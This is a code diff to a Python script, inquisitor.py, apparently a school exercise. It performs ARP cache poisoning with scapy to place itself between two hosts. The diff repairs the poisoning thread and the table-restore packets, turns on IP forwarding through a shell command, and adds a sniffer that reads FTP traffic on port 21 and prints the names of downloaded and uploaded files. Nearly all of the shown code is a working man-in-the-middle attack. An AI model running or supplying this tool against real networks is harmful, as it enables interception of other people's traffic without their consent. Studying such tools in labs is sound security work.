@@ -11,7 +11,8 @@
 #                                                                              #
 # **************************************************************************** #
 
-from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr
+from scapy.all import ARP, send, sniff, get_if_hwaddr, Raw
+from scapy.layers.inet import TCP
 import netifaces
 from time import sleep
 from sys import argv
@@ -37,9 +38,21 @@ def	poison_loop():
 		pass
 
 def	restore_tables():
-	send(ARP(psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target))
-	send(ARP(pdst=ip_src, hwdst=mac_src, psrc=ip_target, hsrc=mac_target))
+	send(ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target))
+	send(ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target))
 
+def process_packet(packet):
+	if packet.haslayer(TCP) and packet.haslayer(Raw):
+		if packet[TCP].sport == 21 or packet[TCP].dport == 21:
+			try:
+				payload = packet[Raw].load
+				data = payload.decode('utf-8', errors='ignore').strip()
+				if data.startswith('RETR '):
+					print("[DOWNLOAD]", data.split()[1])
+				if data.startswith('STOR '):
+					print("[UPLOAD]", data.split()[1])
+			except:
+				pass
 if (len(argv) < 5):
 	print("Usage: inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
 	exit(1)
@@ -63,8 +76,13 @@ ip_target = args.ip_target
 mac_target = args.mac_target
 try:
 	system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	poison_thread = threading.Thread(target=poison_loop())
+	poison_thread = threading.Thread(target=poison_loop)
 	poison_thread.daemon = True
 	poison_thread.start()
-except Exception:
+
+	sniff(filter="tcp port 21", prn=process_packet, store=False)
+except (Exception, KeyboardInterrupt):
+	print("STOPPING ATTACK")
+finally:
 	restore_tables()
+	print("ARP TABLES RESTORED")
